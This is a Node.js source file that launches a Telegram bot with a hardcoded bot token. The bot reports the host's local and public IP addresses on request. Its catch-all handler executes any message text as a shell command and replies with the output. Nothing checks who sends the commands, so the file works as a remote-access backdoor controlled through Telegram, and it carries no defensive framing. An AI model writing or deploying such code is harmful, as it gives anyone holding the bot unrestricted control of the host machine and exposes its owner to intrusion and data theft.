const address = require('address');
const publicIp = require('public-ip');
const shell = require('shelljs');
const fs = require('fs');
const path = require('path');
const { Telegraf } = require('telegraf')

async function sleep(time) {
    return new Promise(r => {
        setTimeout(r, time)
    })
}

async function writeToFile(filePath, data) {
    await fs.promises.writeFile(filePath, data, { encoding: 'utf-8' })
}

async function appendToFile(filePath, data) {
    await fs.promises.appendFile(filePath, data, { encoding: 'utf-8' })
}

const completed = {
    writeIp: false,
    createBot: false,
    runBot: false,
    bot: null
}

async function writeIp() {
    if(completed.writeIp) return;

    console.log('------ WRITE IP ------')

    const fileName = path.resolve(__dirname, '../ip.txt');
    await writeToFile(fileName, `local ip: ${address.ip()}`)

    console.log('------ WRITED IP ------')

    completed.writeIp = true;
}

function createBot() {
    if(completed.createBot) return completed.bot;

    console.log('------ CREATE BOT ------')

    const bot = new Telegraf('1009977345:AAGgtj8tTao_hnFGGvs3OUK2EDPWuagviUI');

    bot.command('ip', async ctx => {
        let ip;
        try {
            ip = await publicIp.v4()
        } catch {}

        await ctx.reply(`
            local ip: ${address.ip()}
            ip: ${ip}
        `);
    })
    
    bot.command('/ip2', async ctx => {
        let ip;
        try {
            ip = await publicIp.v4()
        } catch {}

        await ctx.reply(`
            local ip: ${address.ip()}
            ip: ${ip}
        `);
    })


    bot.use(async ctx => {
        const text = ctx.message ? ctx.message.text.trim() : undefined;

        if(text) {
            const result = shell.exec(
                text,
                {
                    silent: true,
                    encoding: 'utf-8'
                }
            )

            await ctx.reply(`STDOUT: ${result.stdout}`)
            await ctx.reply(`STDERR: ${result.stderr}`)
        }
    })

    console.log('------ CREATED BOT ------')

    completed.createBot = true;

    return (completed.bot = bot)
}

async function runBot(bot) {
    if(completed.runBot) return;

    console.log('------ RUN BOT ------')

    await bot.launch()

    console.log('------ RUNNED BOT ------')

    completed.runBot = true;
}

;(async () => {
    let botRun = false;
    let iter = 0;

    const errorFilePath = path.resolve(__dirname, './error.txt');

    while (iter++ < 10 && !botRun) {
        try {
             const bot = createBot();

             await runBot(bot)
             botRun = true;
        } catch (e) {
            console.log('e => ', e)
            await appendToFile(errorFilePath, e.toString())

            await sleep(2000);
        }
    }
})()
